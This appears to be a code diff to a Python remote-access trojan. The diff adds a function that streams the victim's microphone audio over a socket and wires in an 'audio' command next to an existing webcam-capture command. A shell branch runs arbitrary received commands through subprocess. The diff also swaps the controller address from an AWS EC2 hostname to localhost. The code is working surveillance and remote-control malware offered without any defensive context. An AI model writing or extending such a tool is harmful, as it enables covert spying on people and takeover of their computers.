@@ -5,6 +5,25 @@ import re
 import time
 import subprocess
 import cv2
+import pyaudio
+
+def audio(s):
+    chunk = 1024
+    FORMAT = pyaudio.paInt16
+    channels = 1
+
+    sample_rate = 44100
+    record_seconds = 5
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=channels,
+                    rate=sample_rate,
+                    input=True,
+                    output=True,
+                    frames_per_buffer=chunk)
+    while True:
+        data = stream.read(chunk)
+        s.send(data)
 
 def webcam(s):
     cap = cv2.VideoCapture(0)
@@ -95,6 +114,9 @@ def cmd(s):
         elif cmd == "webcam":
             webcam(s)
             continue
+        elif cmd == 'audio':
+            audio(s)
+            continue
         else:
             s.send((os.getcwd() + ">").encode())
             cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -106,7 +128,7 @@ def cmd(s):
     s.close()
 
 def main():
-    ip = 'ec2-3-90-65-32.compute-1.amazonaws.com'
+    ip = '127.0.0.1'
     port = 1234
     s = socketCreation()
     socketConnection(s, ip, port)
